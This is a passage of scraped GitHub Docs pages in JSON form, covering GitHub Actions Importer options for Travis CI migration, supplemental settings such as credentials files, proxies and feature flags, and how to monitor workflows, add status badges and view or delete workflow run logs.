        "content": "gh actions-importer dry-run travis-ci --output-dir ./path/to/output/ --travis-ci-repository my-travis-ci-repository --source-file-path ./path/to/.travis.yml"
      },
      {
        "type": "heading",
        "level": 4,
        "text": "--allow-inactive-repositories"
      },
      {
        "type": "paragraph",
        "text": "You can use this argument to specify whether GitHub Actions Importer should include inactive repositories in an audit. If this option is not set, inactive repositories are not included in audits."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh actions-importer dry-run travis-ci --output-dir ./path/to/output/ --travis-ci-repository my-travis-ci-repository --allow-inactive-repositories"
      },
      {
        "type": "heading",
        "level": 4,
        "text": "--config-file-path"
      },
      {
        "type": "paragraph",
        "text": "You can use the--config-file-pathargument with theaudit,dry-run, andmigratesubcommands."
      },
      {
        "type": "paragraph",
        "text": "By default, GitHub Actions Importer fetches pipeline contents from source control. The--config-file-pathargument tells GitHub Actions Importer to use the specified source files instead."
      },
      {
        "type": "heading",
        "level": 5,
        "text": "Audit example"
      },
      {
        "type": "paragraph",
        "text": "In this example, GitHub Actions Importer uses the specified YAML configuration file to perform an audit."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh actions-importer audit travis-ci --output-dir ./path/to/output/ --config-file-path ./path/to/travis-ci/config.yml"
      },
      {
        "type": "paragraph",
        "text": "To audit a Travis CI instance using a configuration file, the file must be in the following format and eachrepository_slugvalue must be unique:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "source_files:\n  - repository_slug: travis-org-name/travis-repo-name\n    path: path/to/.travis.yml\n  - repository_slug: travis-org-name/some-other-travis-repo-name\n    path: path/to/.travis.yml"
      },
      {
        "type": "heading",
        "level": 5,
        "text": "Dry run example"
      },
      {
        "type": "paragraph",
        "text": "In this example, GitHub Actions Importer uses the specified YAML configuration file as the source file to perform a dry run."
      },
      {
        "type": "paragraph",
        "text": "The pipeline is selected by matching therepository_slugin the configuration file to the value of the--travis-ci-repositoryoption. Thepathis then used to pull the specified source file."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh actions-importer dry-run travis-ci --travis-ci-repository travis-org-name/travis-repo-name --output-dir ./output/ --config-file-path ./path/to/travis-ci/config.yml"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Supported project languages"
      },
      {
        "type": "paragraph",
        "text": "GitHub Actions Importer supports migrating Travis CI projects in the following languages."
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "android",
          "bash",
          "c",
          "clojure",
          "c++",
          "crystal",
          "c#",
          "d",
          "dart",
          "elixir",
          "erlang",
          "generic",
          "go",
          "groovy",
          "haskell",
          "haxe",
          "java",
          "julia",
          "matlab",
          "minimal",
          "nix",
          "node_js",
          "objective-c",
          "perl",
          "perl6",
          "php",
          "python",
          "r",
          "ruby",
          "rust",
          "scala",
          "sh",
          "shell",
          "smalltalk",
          "swift"
        ]
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Supported syntax for Travis CI pipelines"
      },
      {
        "type": "paragraph",
        "text": "The following table shows the type of properties GitHub Actions Importer is currently able to convert. For more details about how Travis CI pipeline syntax aligns with GitHub Actions, seeMigrating from Travis CI to GitHub Actions."
      },
      {
        "type": "paragraph",
        "text": "For information about supported Travis CI constructs, see thegithub/gh-actions-importerrepository."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Environment variables syntax"
      },
      {
        "type": "paragraph",
        "text": "GitHub Actions Importer uses the mapping in the table below to convert default Travis CI environment variables to the closest equivalent in GitHub Actions."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Legal notice"
      },
      {
        "type": "paragraph",
        "text": "Portions have been adapted fromhttps://github.com/github/gh-actions-importer/under the MIT license:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "MIT License\n\nCopyright (c) 2022 GitHub\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the \"Software\"), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in all\ncopies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\nSOFTWARE."
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/supplemental-arguments-and-settings",
    "content": [
      {
        "type": "paragraph",
        "text": "Legal notice"
      },
      {
        "type": "paragraph",
        "text": "This article provides general information for configuring GitHub Actions Importer's supplemental arguments and settings, such as optional parameters, path arguments, and network settings."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Optional parameters"
      },
      {
        "type": "paragraph",
        "text": "GitHub Actions Importer has several optional parameters that you can use to customize the migration process."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Limiting allowed actions"
      },
      {
        "type": "paragraph",
        "text": "The following options can be used to limit which actions are allowed in converted workflows. When used in combination, these options expand the list of allowed actions. If none of these options are supplied, then all actions are allowed."
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "--allowed-actionsspecifies a list of actions to allow in converted workflows. Wildcards are supported. Any other actions other than those provided will be disallowed.For example:--allowed-actions actions/checkout@v4 actions/upload-artifact@* my-org/*You can provide an empty list to disallow all actions. For example,--allowed-actions=.",
          "--allow-verified-actionsspecifies that all actions from verified creators are allowed.",
          "--allow-github-created-actionsspecifies that actions published from thegithuboractionsorganizations are allowed.For example, such actions includegithub/super-linterandactions/checkout.This option is equivalent to--allowed-actions actions/* github/*."
        ]
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Using a credentials file for authentication"
      },
      {
        "type": "paragraph",
        "text": "The--credentials-fileparameter specifies the path to a file containing credentials for different servers that GitHub Actions Importer can authenticate to. This is useful when build scripts (such as.travis.ymlorjenkinsfile) are stored in multiple GitHub Enterprise Server instances."
      },
      {
        "type": "paragraph",
        "text": "A credentials file must be a YAML file containing a list of server and access token combinations. GitHub Actions Importer uses the credentials for the URL that most closely matches the network request being made."
      },
      {
        "type": "paragraph",
        "text": "For example:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "- url: https://github.com\n  access_token: ghp_mygeneraltoken\n- url: https://github.com/specific_org/\n  access_token: ghp_myorgspecifictoken\n- url: https://jenkins.org\n  access_token: abc123\n  username: marty_mcfly"
      },
      {
        "type": "paragraph",
        "text": "For the above credentials file, GitHub Actions Importer uses the access tokenghp_mygeneraltokento authenticate all network requests tohttps://github.com,unlessthe network request is for a repository in thespecific_orgorganization. In that case, theghp_myorgspecifictokentoken is used to authenticate instead."
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Alternative source code providers"
      },
      {
        "type": "paragraph",
        "text": "GitHub Actions Importer can automatically fetch source code from non-GitHub repositories. A credentials file can specify theprovider, the provider URL, and the credentials needed to retrieve the source code."
      },
      {
        "type": "paragraph",
        "text": "For example:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "- url: https://gitlab.com\n  access_token: super_secret_token\n  provider: gitlab"
      },
      {
        "type": "paragraph",
        "text": "For the above example, GitHub Actions Importer uses the tokensuper_secret_tokento retrieve any source code that is hosted onhttps://gitlab.com."
      },
      {
        "type": "paragraph",
        "text": "Supported values forproviderare:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "github(default)",
          "gitlab",
          "bitbucket_server",
          "azure_devops"
        ]
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Controlling optional features"
      },
      {
        "type": "paragraph",
        "text": "You can use the--featuresoption to limit the features used in workflows that GitHub Actions Importer creates. This is useful for excluding newer GitHub Actions syntax from workflows when migrating to an older GitHub Enterprise Server instance. When using the--featuresoption, you must specify the version of GitHub Enterprise Server that you are migrating to."
      },
      {
        "type": "paragraph",
        "text": "For example:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh actions-importer dry-run ... --features ghes-3.3"
      },
      {
        "type": "paragraph",
        "text": "The supported values for--featuresare:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "all(default value)",
          "ghes-latest",
          "ghes-<number>, where<number>is the version of GitHub Enterprise Server,3.0or later. For example,ghes-3.3."
        ]
      },
      {
        "type": "paragraph",
        "text": "You can view the list of available feature flags by GitHub Actions Importer by running thelist-featurescommand. For example:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh actions-importer list-features"
      },
      {
        "type": "paragraph",
        "text": "You should see an output similar to the following."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "Available feature flags:\n\nactions/cache (disabled):\n        Control usage of actions/cache inside of workflows. Outputs a comment if not enabled.\n        GitHub Enterprise Server >= ghes-3.5 required.\n\ncomposite-actions (enabled):\n        Minimizes resulting workflow complexity through the use of composite actions. See https://docs.github.com/en/actions/creating-actions/creating-a-composite-action for more information.\n        GitHub Enterprise Server >= ghes-3.4 required.\n\nreusable-workflows (disabled):\n        Avoid duplication by re-using existing workflows. See https://docs.github.com/en/actions/using-workflows/reusing-workflows for more information.\n        GitHub Enterprise Server >= ghes-3.4 required.\n\nworkflow-concurrency-option-allowed (enabled):\n        Allows the use of the `concurrency` option in workflows. See https://docs.github.com/en/actions/reference/workflow-syntax-for-github-actions#concurrency for more information.\n        GitHub Enterprise Server >= ghes-3.2 required.\n\nEnable features by passing --enable-features feature-1 feature-2\nDisable features by passing --disable-features feature-1 feature-2"
      },
      {
        "type": "paragraph",
        "text": "To toggle feature flags, you can use either of the following methods:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Use the--enable-featuresand--disable-featuresoptions when running agh actions-importercommand.",
          "Use an environment variable for each feature flag."
        ]
      },
      {
        "type": "paragraph",
        "text": "You can use the--enable-featuresand--disable-featuresoptions to select specific features to enable or disable for the duration of the command.\nFor example, the following command disables use ofactions/cacheandcomposite-actions:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh actions-importer dry-run ... --disable-features=composite-actions actions/cache"
      },
      {
        "type": "paragraph",
        "text": "You can use theconfigure --featurescommand to interactively configure feature flags and automatically write them to your environment:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "$ gh actions-importer configure --features\n\n✔ Which features would you like to configure?: actions/cache, reusable-workflows\n✔ actions/cache (disabled): Enable\n? reusable-workflows (disabled):\n› Enable\n  Disable"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Disabling network response caching"
      },
      {
        "type": "paragraph",
        "text": "By default, GitHub Actions Importer caches responses from network requests to reduce network load and reduce run time. You can use the--no-http-cacheoption to disable the network cache. For example:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh actions-importer forecast ... --no-http-cache"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Path arguments"
      },
      {
        "type": "paragraph",
        "text": "When running GitHub Actions Importer, path arguments are relative to the container's disk, so absolute paths relative to the container's host machine are not supported. When GitHub Actions Importer is run, the container's/datadirectory is mounted to the directory where GitHub Actions Importer is run."
      },
      {
        "type": "paragraph",
        "text": "For example, the following command, when used in the/Users/monadirectory, outputs the GitHub Actions Importer audit summary to the/Users/mona/outdirectory:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh actions-importer audit --output-dir /data/out"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Using a proxy"
      },
      {
        "type": "paragraph",
        "text": "To access servers that are configured with a HTTP proxy, you must set the following environment variables with the proxy's URL:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "OCTOKIT_PROXY: for any GitHub server.",
          "HTTP_PROXY(orHTTPS_PROXY): for any other servers."
        ]
      },
      {
        "type": "paragraph",
        "text": "For example:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "export OCTOKIT_PROXY=https://proxy.example.com:8443\nexport HTTPS_PROXY=$OCTOKIT_PROXY"
      },
      {
        "type": "paragraph",
        "text": "If the proxy requires authentication, a username and password must be included in the proxy URL. For example,https://username:password@proxy.url:port."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Disabling SSL certificate verification"
      },
      {
        "type": "paragraph",
        "text": "By default, GitHub Actions Importer verifies SSL certificates when making network requests. You can disable SSL certificate verification with the--no-ssl-verifyoption. For example:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh actions-importer audit --output-dir ./output --no-ssl-verify"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Legal notice"
      },
      {
        "type": "paragraph",
        "text": "Portions have been adapted fromhttps://github.com/github/gh-actions-importer/under the MIT license:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "MIT License\n\nCopyright (c) 2022 GitHub\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the \"Software\"), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in all\ncopies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\nSOFTWARE."
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/monitoring-workflows/about-monitoring-workflows",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "Monitoring your workflows"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Monitoring your current jobs in your organization or enterprise"
      },
      {
        "type": "paragraph",
        "text": "To identify any constraints with concurrency or queuing, you can check how many jobs are currently being processed on the GitHub-hosted runners in your organization or enterprise. For more information, seeMonitoring your current jobs."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Using the visualization graph"
      },
      {
        "type": "paragraph",
        "text": "Every workflow run generates a real-time graph that illustrates the run progress. You can use this graph to monitor and debug workflows. For example:"
      },
      {
        "type": "paragraph",
        "text": "For more information, seeUsing the visualization graph."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Adding a workflow status badge"
      },
      {
        "type": "paragraph",
        "text": "A status badge shows whether a workflow is currently failing or passing. A common place to add a status badge is in theREADME.mdfile of your repository, but you can add it to any web page you'd like. By default, badges display the status of your default branch. If there are no workflow runs on your default branch, it will display the status of the most recent run across all branches. You can display the status of a workflow run for a specific branch or event using thebranchandeventquery parameters in the URL."
      },
      {
        "type": "paragraph",
        "text": "For more information, seeAdding a workflow status badge."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Viewing job execution time"
      },
      {
        "type": "paragraph",
        "text": "To identify how long a job took to run, you can view its execution time. For more information, seeViewing job execution time."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Viewing workflow run history"
      },
      {
        "type": "paragraph",
        "text": "You can view the status of each job and step in a workflow. For more information, seeViewing workflow run history."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Monitoring GitHub Actions metrics"
      },
      {
        "type": "paragraph",
        "text": "To analyze the efficiency and reliability of your workflows using metrics, seeViewing GitHub Actions metrics."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Monitoring self-hosted runners"
      },
      {
        "type": "paragraph",
        "text": "If you use self-hosted runners, you can view their activity and diagnose common issues."
      },
      {
        "type": "paragraph",
        "text": "For more information, seeMonitoring and troubleshooting self-hosted runners."
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/monitoring-workflows/adding-a-workflow-status-badge",
    "content": [
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "Workflow badges in a private repository are not accessible externally, so you won't be able to embed them or link to them from an external site."
      },
      {
        "type": "paragraph",
        "text": "A status badge shows whether a workflow is currently failing or passing. A common place to add a status badge is in theREADME.mdfile of your repository, but you can add it to any web page you'd like. By default, badges display the status of your default branch. If there are no workflow runs on your default branch, it will display the status of the most recent run across all branches. You can display the status of a workflow run for a specific branch or event using thebranchandeventquery parameters in the URL."
      },
      {
        "type": "paragraph",
        "text": "To add a workflow status badge to yourREADME.mdfile, first find the URL for the status badge you would like to display. Then you can use Markdown to display the badge as an image in yourREADME.mdfile. For more information about image markup in Markdown, seeBasic writing and formatting syntax."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Using the UI"
      },
      {
        "type": "paragraph",
        "text": "You can create a workflow status badge directly on the UI using the workflow file name, branch parameter, and event parameter."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "On GitHub, navigate to the main page of the repository.",
          "Under your repository name, clickActions.",
          "In the left sidebar, click the workflow you want to see.",
          "On the right side of the page, next to the \"Filter workflow runs\" field, clickto display a dropdown menu and clickCreate status badge.",
          "Optionally, select a branch if you want to display the status badge for a branch different from the default branch.",
          "Optionally, select the event that will trigger the workflow.",
          "ClickCopy status badge Markdown.",
          "Copy the Markdown into yourREADME.mdfile."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Using the workflow file name"
      },
      {
        "type": "paragraph",
        "text": "You can build the URL for a workflow status badge using the name of the workflow file:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "https://github.com/OWNER/REPOSITORY/actions/workflows/WORKFLOW-FILE/badge.svg"
      },
      {
        "type": "paragraph",
        "text": "To display the workflow status badge in yourREADME.mdfile, use the Markdown markup for embedding images. For more information about image markup in Markdown, seeBasic writing and formatting syntax."
      },
      {
        "type": "paragraph",
        "text": "For example, add the following Markdown to yourREADME.mdfile to add a status badge for a workflow with the file path.github/workflows/main.yml. TheOWNERof the repository is thegithuborganization and theREPOSITORYname isdocs."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "![example workflow](https://github.com/github/docs/actions/workflows/main.yml/badge.svg)"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Using thebranchparameter"
      },
      {
        "type": "paragraph",
        "text": "To display the status of a workflow run for a specific branch, add?branch=BRANCH-NAMEto the end of the status badge URL."
      },
      {
        "type": "paragraph",
        "text": "For example, add the following Markdown to yourREADME.mdfile to display a status badge for a branch with the namefeature-1."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "![example branch parameter](https://github.com/github/docs/actions/workflows/main.yml/badge.svg?branch=feature-1)"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Using theeventparameter"
      },
      {
        "type": "paragraph",
        "text": "To display the status of workflow runs triggered by thepushevent, add?event=pushto the end of the status badge URL."
      },
      {
        "type": "paragraph",
        "text": "For example, add the following Markdown to yourREADME.mdfile to display a badge with the status of workflow runs triggered by thepushevent, which will show the status of the build for the current state of that branch."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "![example event parameter](https://github.com/github/docs/actions/workflows/main.yml/badge.svg?event=push)"
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/monitoring-workflows/notifications-for-workflow-runs",
    "content": [
      {
        "type": "paragraph",
        "text": "If you enable email or web notifications for GitHub Actions, you'll receive a notification when any workflow runs that you've triggered have completed. The notification will include the workflow run's status (including successful, failed, neutral, and canceled runs). You can also choose to receive a notification only when a workflow run has failed. For more information about enabling or disabling notifications, seeAbout notifications."
      },
      {
        "type": "paragraph",
        "text": "Notifications for scheduled workflows are sent to the user who initially created the workflow. If a different user updates the cron syntax in the workflow file, subsequent notifications will be sent to that user instead. If a scheduled workflow is disabled and then re-enabled, notifications will be sent to the user who re-enabled the workflow rather than the user who last modified the cron syntax."
      },
      {
        "type": "paragraph",
        "text": "You can also see the status of workflow runs on a repository's Actions tab. For more information, seeManaging workflow runs and deployments."
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/monitoring-workflows/using-the-visualization-graph",
    "content": [
      {
        "type": "list",
        "ordered": true,
        "items": [
          "On GitHub, navigate to the main page of the repository.",
          "Under your repository name, clickActions.",
          "In the left sidebar, click the workflow you want to see.",
          "From the list of workflow runs, click the name of the run to see the workflow run summary.",
          "The graph displays each job in the workflow. An icon to the left of the job name indicates the status of the job. Lines between jobs indicate dependencies.",
          "To view a job's log, click the job."
        ]
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/monitoring-workflows/using-workflow-run-logs",
    "content": [
      {
        "type": "paragraph",
        "text": "You can see whether a workflow run is in progress or complete from the workflow run page. You must be logged in to a GitHub account to view workflow run information, including for public repositories. For more information, seeAccess permissions on GitHub."
      },
      {
        "type": "paragraph",
        "text": "If the run is complete, you can see whether the result was a success, failure, canceled, or neutral. If the run failed, you can view and search the build logs to diagnose the failure and re-run the workflow. You can also view billable job execution minutes, or download logs and build artifacts."
      },
      {
        "type": "paragraph",
        "text": "GitHub Actions use the Checks API to output statuses, results, and logs for a workflow. GitHub creates a new check suite for each workflow run. The check suite contains a check run for each job in the workflow, and each job includes steps. GitHub Actions are run as a step in a workflow. For more information about the Checks API, seeREST API endpoints for checks."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "Ensure that you only commit valid workflow files to your repository. If.github/workflowscontains an invalid workflow file, GitHub Actions generates a failed workflow run for every new commit."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Viewing logs to diagnose failures"
      },
      {
        "type": "paragraph",
        "text": "If your workflow run fails, you can see which step caused the failure and review the failed step's build logs to troubleshoot. You can see the time it took for each step to run. You can also copy a permalink to a specific line in the log file to share with your team. Read access to the repository is required to perform these steps."
      },
      {
        "type": "paragraph",
        "text": "In addition to the steps configured in the workflow file, GitHub adds two additional steps to each job to set up and complete the job's execution. These steps are logged in the workflow run with the names \"Set up job\" and \"Complete job\"."
      },
      {
        "type": "paragraph",
        "text": "For jobs run on GitHub-hosted runners, \"Set up job\" records details of the runner image, and includes a link to the list of preinstalled tools that were present on the runner machine."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "On GitHub, navigate to the main page of the repository.",
          "Under your repository name, clickActions.",
          "In the left sidebar, click the workflow you want to see.",
          "From the list of workflow runs, click the name of the run to see the workflow run summary.",
          "UnderJobsor in the visualization graph, click the job you want to see.",
          "Any failed steps are automatically expanded to display the results.",
          "Optionally, to get a link to a specific line in the logs, click on the step's line number. You can then copy the link from the address bar of your web browser."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Searching logs"
      },
      {
        "type": "paragraph",
        "text": "You can search the build logs for a particular step. When you search logs, only expanded steps are included in the results. Read access to the repository is required to perform these steps."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "On GitHub, navigate to the main page of the repository.",
          "Under your repository name, clickActions.",
          "In the left sidebar, click the workflow you want to see.",
          "From the list of workflow runs, click the name of the run to see the workflow run summary.",
          "UnderJobsor in the visualization graph, click the job you want to see.",
          "In the upper-right corner of the log output, in theSearch logssearch box, type a search query."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Downloading logs"
      },
      {
        "type": "paragraph",
        "text": "You can download the log files from your workflow run. You can also download a workflow's artifacts. For more information, seeStoring and sharing data from a workflow. Read access to the repository is required to perform these steps."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "On GitHub, navigate to the main page of the repository.",
          "Under your repository name, clickActions.",
          "In the left sidebar, click the workflow you want to see.",
          "From the list of workflow runs, click the name of the run to see the workflow run summary.",
          "UnderJobsor in the visualization graph, click the job you want to see.",
          "In the upper right corner of the log, select thedropdown menu, then clickDownload log archive."
        ]
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "When you download the log archive for a workflow that was partially re-run, the archive only includes the jobs that were re-run. To get a complete set of logs for jobs that were run from a workflow, you must download the log archives for the previous run attempts that ran the other jobs."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Deleting logs"
      },
      {
        "type": "paragraph",
        "text": "You can delete the log files from your workflow runs through the GitHub web interface or programmatically. Write access to the repository is required to perform these steps."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Deleting logs via the GitHub web interface"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "On GitHub, navigate to the main page of the repository.",
          "Under your repository name, clickActions.",
          "In the left sidebar, click the workflow you want to see.",
          "From the list of workflow runs, click the name of the run to see the workflow run summary.",
          "In the upper-right corner, select thedropdown menu, then clickDelete all logs.",
          "Review the confirmation prompt."
        ]
      },
      {
        "type": "paragraph",
        "text": "After deleting logs, theDelete all logsbutton is removed to indicate that no log files remain in the workflow run."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Deleting logs programmatically"
      },
      {
        "type": "paragraph",
        "text": "You can use the following script to automatically delete all logs for a workflow. This can be a useful way to clean up logs for multiple workflow runs."
      },
      {
        "type": "paragraph",
        "text": "To run the example script below:"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Copy the code example and save it to a file calleddelete-logs.sh.",
          "Grant it the execute permission withchmod +x delete-logs.sh.",
          "Run the following command, whereREPOSITORY_NAMEis the name of your repository andWORKFLOW_NAMEis the file name of your workflow.Shell./delete-logs.sh REPOSITORY_NAME WORKFLOW_NAME./delete-logs.sh REPOSITORY_NAME WORKFLOW_NAMEFor example, to delete all of the logs in themonalisa/octocatrepository for the.github/workflows/ci.yamlworkflow, you would run./delete-logs.sh monalisa/octocat ci.yaml."
        ]
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Example script"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "#!/usr/bin/env bash\n\n# Delete all logs for a given workflow\n# Usage: delete-logs.sh <repository> <workflow-name>\n\nset -oe pipefail\n\nREPOSITORY=$1\nWORKFLOW_NAME=$2\n\n# Validate arguments\nif [[ -z \"$REPOSITORY\" ]]; then\n  echo \"Repository is required\"\n  exit 1\nfi\n\nif [[ -z \"$WORKFLOW_NAME\" ]]; then\n  echo \"Workflow name is required\"\n  exit 1\nfi\n\necho \"Getting all completed runs for workflow $WORKFLOW_NAME in $REPOSITORY\"\n\nRUNS=$(\n  gh api \\\n    -H \"Accept: application/vnd.github+json\" \\\n    -H \"X-GitHub-Api-Version: 2022-11-28\" \\\n    \"/repos/$REPOSITORY/actions/workflows/$WORKFLOW_NAME/runs\" \\\n    --paginate \\\n    --jq '.workflow_runs[] | select(.conclusion != \"\") | .id'\n)\n\necho \"Found $(echo \"$RUNS\" | wc -l) completed runs for workflow $WORKFLOW_NAME\"\n\n# Delete logs for each run\nfor RUN in $RUNS; do\n  echo \"Deleting logs for run $RUN\"\n  gh api \\\n    --silent \\\n    --method DELETE \\\n    -H \"Accept: application/vnd.github+json\" \\\n    -H \"X-GitHub-Api-Version: 2022-11-28\" \\\n    \"/repos/$REPOSITORY/actions/runs/$RUN/logs\" || echo \"Failed to delete logs for run $RUN\"\n\n  # Sleep for 100ms to avoid rate limiting\n  sleep 0.1\ndone"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Viewing logs with GitHub CLI"
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "To learn more about GitHub CLI, seeAbout GitHub CLI."
      },
      {
        "type": "paragraph",
        "text": "To view the log for a specific job, use therun viewsubcommand. Replacerun-idwith the ID of run that you want to view logs for. GitHub CLI returns an interactive menu for you to choose a job from the run. If you don't specifyrun-id, GitHub CLI returns an interactive menu for you to choose a recent run, and then returns another interactive menu for you to choose a job from the run."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh run view RUN_ID --log"
      },
      {
        "type": "paragraph",
        "text": "You can also use the--jobflag to specify a job ID. Replacejob-idwith the ID of the job that you want to view logs for."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh run view --job JOB_ID --log"
      },
      {
        "type": "paragraph",
        "text": "You can usegrepto search the log. For example, this command will return all log entries that contain the worderror."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh run view --job JOB_ID --log | grep error"
      },
      {
        "type": "paragraph",
        "text": "To filter the logs for any failed steps, use--log-failedinstead of--log."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh run view --job JOB_ID --log-failed"
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/monitoring-workflows/viewing-job-execution-time",
    "content": [
      {
        "type": "paragraph",
        "text": "Billable job execution minutes are only shown for jobs run on private repositories that use GitHub-hosted runners and are rounded up to the next minute. There are no billable minutes when using GitHub Actions in public repositories or for jobs run on self-hosted runners."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "On GitHub, navigate to the main page of the repository.",
          "Under your repository name, clickActions.",
          "In the left sidebar, click the workflow you want to see.",
          "From the list of workflow runs, click the name of the run to see the workflow run summary.",
          "Under the job summary, you can view the job's execution time.",
          "To view details about the billable job execution time, in the left sidebar under \"Run details\", clickUsage.NoteThe billable time shown does not include any minute multipliers. To view your total GitHub Actions usage, including minute multipliers, seeViewing your GitHub Actions usage."
        ]
      }
    ]
  },
  {
